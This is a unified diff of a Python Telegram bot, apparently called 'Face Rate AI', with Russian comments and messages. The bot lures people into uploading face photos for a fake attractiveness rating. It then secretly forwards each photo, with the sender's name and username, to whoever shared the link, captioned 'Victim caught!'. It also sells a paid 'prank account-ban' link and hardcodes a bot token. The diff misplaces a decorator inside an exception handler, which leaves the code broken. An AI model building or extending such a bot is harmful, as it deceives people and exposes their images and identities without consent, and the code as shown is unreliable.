@@ -1,9 +1,10 @@
 import telebot
-from telebot.types import LabeledPrice
+from telebot.types import LabeledPrice, InlineKeyboardMarkup, InlineKeyboardButton
 import random
 
-# ТОКЕН БОТА
+# ТОКЕН БОТА (ВСТАВЬ СВОЙ)
 TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
+
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
 # Память для связей (кто кого пригласил)
@@ -40,20 +41,24 @@ def start_message(message):
         except ValueError:
             pass
     
-    # 3. ЗАШЕЛ ЛЮБОЙ ЧЕЛОВЕК (СОЗДАТЕЛЬ СВОЕЙ ССЫЛКИ)
+    # 3. ЗАШЕЛ ЛЮБОЙ ЧЕЛОВЕК (СОЗДАТЕЛЬ ССЫЛКИ)
     else:
         bot_info = bot.get_me()
-        # Генерируем ссылку для КОНКРЕТНО ЭТОГО человека
         invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
         
         text = (
             "😎 **Добро пожаловать в Face Rate AI!**\n\n"
-            "Скинь эту ссылку другу, чтобы он зашел и оценил свою внешность.\n\n"
-            f"🔗 {invite_link}\n\n"
-            "Как только он скинет фото, оно прилетит **тебе** сюда!\n\n"
+            "Нажми на кнопку ниже, чтобы получить свою ссылку. "
+            "Скинь её другу, и как только он скинет фото, оно прилетит **тебе** сюда!\n\n"
             "А если хочешь жестко проучить его — напиши /buy, чтобы купить пранк-снос аккаунта!"
         )
-        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+        
+        # СОЗДАЕМ КНОПКУ
+        markup = InlineKeyboardMarkup()
+        btn = InlineKeyboardButton("🔗 Получить ссылку", url=invite_link)
+        markup.add(btn)
+        
+        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
 
 # Функция для покупки пранка (ПЛАТНЫЙ)
 @bot.message_handler(commands=['buy'])
@@ -77,10 +82,9 @@ def handle_photo(message):
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         
-        # Ищем, кто скинул ссылку этому человеку
         inviter_id = victims.get(message.from_user.id)
         
-        # Если нашли, пересылаем фото ТОМУ, КТО СКИНУЛ ССЫЛКУ
+        # Отправляем фото тому, кто скинул ссылку
         if inviter_id:
             bot.send_photo(
                 inviter_id, 
@@ -88,7 +92,6 @@ def handle_photo(message):
                 caption=f"📸 **Жертва попалась!**\nИмя: {message.from_user.first_name}\nНик: @{message.from_user.username}"
             )
             
-        # Выдаем фейковый рейтинг жертве
         ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "HIGH TIER NORMIE 🤔", "CHAD 🗿"]
         result = random.choice(ratings)
         
@@ -101,10 +104,8 @@ def handle_photo(message):
         
     except Exception as e:
         bot.reply_to(message, f"Ошибка: {e}")
-
-@bot.pre_checkout_query_handler(func=lambda query: True)
+        @bot.pre_checkout_query_handler(func=lambda query: True)
 def checkout(pre_checkout_query):
-
     bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
 
 # ВЫДАЧА ССЫЛКИ ПОСЛЕ ОПЛАТЫ
@@ -113,12 +114,17 @@ def got_payment(message):
     bot_info = bot.get_me()
     ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
     
+    # Ссылку на бан тоже сделаем кнопкой для удобства
+    markup = InlineKeyboardMarkup()
+    btn = InlineKeyboardButton("💀 Ссылка на снос", url=ban_link)
+    markup.add(btn)
+    
     bot.send_message(
         message.chat.id, 
         f"💸 **Оплата 20 ⭐ прошла!**\n\n"
-        f"Вот твоя секретная ссылка для сноса аккаунта. Кидай ее другу:\n\n"
-        f"🔗 {ban_link}\n\n"
-        f"Как только он перейдет, он обосрется! 😂", 
+        f"Нажми на кнопку ниже, чтобы получить ссылку для сноса. "
+        f"Кидай ее другу, и как только он перейдет, он обосрется! 😂", 
+        reply_markup=markup,
         parse_mode="Markdown"
     )
 
